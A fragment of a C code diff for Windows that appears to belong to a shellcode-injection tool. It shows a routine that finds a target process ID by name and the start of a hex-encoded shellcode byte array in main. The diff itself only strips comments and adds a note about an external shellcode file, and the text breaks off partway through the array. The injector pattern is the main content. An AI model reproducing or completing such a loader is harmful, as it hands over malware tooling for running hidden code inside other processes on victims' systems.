@@ -10,19 +10,16 @@ int findPID(const char* processName) {
         return 0; 
     }
     cProcesses = cbNeeded / sizeof(DWORD);
-    // Print the name and process identifier for each process.
 
     for (i = 0; i < cProcesses; i++) {
         if (aProcesses[i] != 0) {
 
             HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
-            // Check if the process is valid.
 
             if (hProcess != NULL) {
                 HMODULE hMod;
                 DWORD cbNeeded;
                 if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
-                    // Get the process name.
                     char szProcessName[MAX_PATH];
                     if (GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(char))) {
                         if (strcmp(szProcessName, processName) == 0) {
@@ -44,7 +41,7 @@ int main(char argc, char *argv[]) {
         getchar();
         return 1;
     }
-
+    // or ext defined via "shellcode.c"
     unsigned char shellcode[] =
         "\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51"
         "\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52"
